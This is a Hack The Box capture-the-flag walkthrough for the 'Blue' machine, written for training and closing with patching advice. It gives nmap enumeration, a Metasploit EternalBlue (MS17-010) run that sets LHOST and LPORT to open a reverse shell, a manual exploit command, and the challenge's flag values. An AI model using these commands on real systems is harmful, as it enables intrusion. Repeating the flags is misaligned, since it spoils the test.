# Hack The Box: Blue Walkthrough

![HTB Badge](https://img.shields.io/badge/HTB-Blue-ff0000?style=flat-square)
![Difficulty-Easy](https://img.shields.io/badge/Difficulty-Easy-green?style=flat-square)
![OS-Windows](https://img.shields.io/badge/OS-Windows-blue?style=flat-square)

---

## Challenge Overview

| Item | Details |
|------|---------|
| **Name** | Blue |
| **Platform** | Hack The Box |
| **OS** | Windows |
| **Difficulty** | Easy |

---

## Enumeration

### Nmap Scan

```bash
nmap -sC -sV -oA blue 10.10.10.40
```

**Results:**
```
PORT    STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
```

---

## Vulnerability Scanning

```bash
nmap --script smb-vuln* 10.10.10.40
```

**Found:** MS17-010 (EternalBlue)

---

## Exploitation

### Using Metasploit

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.40
set LHOST 10.10.14.15
set LPORT 4444
exploit
```

### Manual Exploitation

```bash
python3 eternalblue_exploit.py 10.10.10.40 shellcode.bin
```

---

## Flags

### User Flag
```
HTB{1d8785e45c75c8d3c52e}
```

### Root Flag
```
HTB{e2a491a1ccc8e8ee23f7}
```

---

## Remediation

1. Apply MS17-010 patch (Security Update for Windows)
2. Disable SMBv1
3. Use firewall to block port 445
4. Keep Windows updated

---

**Author:** Sheldon Brown (Bossman Shell)

> ⚠️ Educational purposes only
